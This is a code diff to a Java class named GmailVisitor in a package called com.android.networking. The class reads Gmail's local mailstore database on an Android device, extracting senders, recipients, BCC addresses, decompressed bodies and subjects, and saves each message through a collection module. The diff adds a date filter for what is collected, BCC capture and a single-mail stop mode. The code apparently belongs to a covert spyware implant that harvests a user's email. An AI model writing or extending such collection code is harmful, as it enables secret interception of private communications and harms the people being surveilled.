@@ -12,6 +12,7 @@ import android.database.Cursor;
 import com.android.networking.auto.Cfg;
 import com.android.networking.db.RecordVisitor;
 import com.android.networking.module.email.Email;
+import com.android.networking.module.message.Filter;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
 
@@ -28,11 +29,14 @@ public class GmailVisitor extends RecordVisitor {
 	public int lastId;
 	private String from;
 	private boolean requestStop;
+	private Filter filter;
+	private boolean stopRequest;
 
-	public GmailVisitor(ModuleMessage moduleMessage, String mailstore) {
+	public GmailVisitor(ModuleMessage moduleMessage, String mailstore, Filter filterCollect) {
 		this.moduleMessage = moduleMessage;
 		this.from = mailstore.substring("mailstore.".length(), mailstore.length() - ".db".length());
 		this.mailstore = mailstore;
+		this.filter = filterCollect;
 	}
 
 	public static String decompress(byte[] compressed) throws IOException {
@@ -68,6 +72,7 @@ public class GmailVisitor extends RecordVisitor {
 		String fromAddress = cursor.getString(1);
 		String toAddresses = cursor.getString(2);
 		String ccAddresses = cursor.getString(3);
+		String bccAddresses = cursor.getString(4);
 		byte[] bodyCompressed = cursor.getBlob(5);
 		Date timestamp = new Date(cursor.getLong(6));
 		String subject = cursor.getString(7);
@@ -89,11 +94,14 @@ public class GmailVisitor extends RecordVisitor {
 			}
 		}
 
-		boolean incoming = fromAddress.contains(from);
+		boolean incoming = !fromAddress.contains(from);
 		Email m = new Email(incoming, timestamp, fromAddress, toAddresses, ccAddresses, body, snippet, subject);
 		moduleMessage.saveEmail(m);
 		moduleMessage.updateMarkupMail(mailstore, id, false);
 
+		if(Cfg.ONEMAIL){
+			stopRequest=true;
+		}
 		return id;
 	}
 
@@ -111,12 +119,16 @@ public class GmailVisitor extends RecordVisitor {
 
 	@Override
 	public String getSelection() {
-		return selection + lastId;
+		String where = selection + lastId;
+		if(filter.doFilterFromDate){
+			where += " and dateSentMs > " + filter.fromDate.getTime();
+		}
+		return where;
 	}
 
 	@Override
 	public boolean isStopRequested() {
-		return moduleMessage.isStopRequested();
+		return moduleMessage.isStopRequested() || stopRequest;
 	}
 
 }
